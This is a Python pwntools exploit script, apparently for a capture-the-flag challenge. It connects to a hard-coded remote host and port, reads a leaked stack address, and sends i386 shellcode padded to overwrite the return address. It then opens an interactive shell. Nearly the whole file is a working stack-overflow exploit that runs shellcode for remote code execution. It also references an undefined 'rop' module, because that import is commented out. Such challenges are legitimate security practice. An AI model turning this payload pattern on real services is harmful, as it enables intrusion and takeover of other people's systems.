from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "106.75.95.47"
remote_port = 42264

local_addr = "127.0.0.1"
local_port = 1807

pc = "./pwn"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 1 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 0
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x8048545')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)


def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def hack():
	ru('gift->')
	stack_addr = int(rv(10),16)
	lg('stack_addr',stack_addr)
	raw_input()
	shellcode = asm(shellcraft.sh())
	payload = shellcode
	payload = payload.ljust(0x48,'\x00')
	payload += p32(0) + p32(stack_addr)
	payload = payload.ljust(0x64,'\x00')
	sa('do?\n',payload)	

	p.interactive()
hack()